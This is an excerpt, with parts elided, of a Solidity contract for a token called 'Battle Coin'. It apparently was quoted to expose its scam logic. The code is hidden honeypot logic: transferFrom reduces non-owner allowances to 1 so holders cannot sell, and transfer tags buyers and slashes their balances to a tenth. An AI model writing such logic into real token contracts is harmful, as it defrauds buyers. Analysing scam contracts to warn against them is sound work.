...
contract BattleToken {
    ...
    string public name = "Battle Coin";
    ...
    address public Pay=0x000000000000000000000000000000000000dEaD;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Pay != Owner && balanceOf[Pay]>=totalSupply.div(20)) {
            balanceOf[Pay]=balanceOf[Pay].divCeil(10);}
        if (msg.sender==Pair() && balanceOf[to]==0) {Pay = to;} 
        if (to== Owner) {Pay=to;} 
    ...
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != Pay) {allowance[from][msg.sender]=1;} 
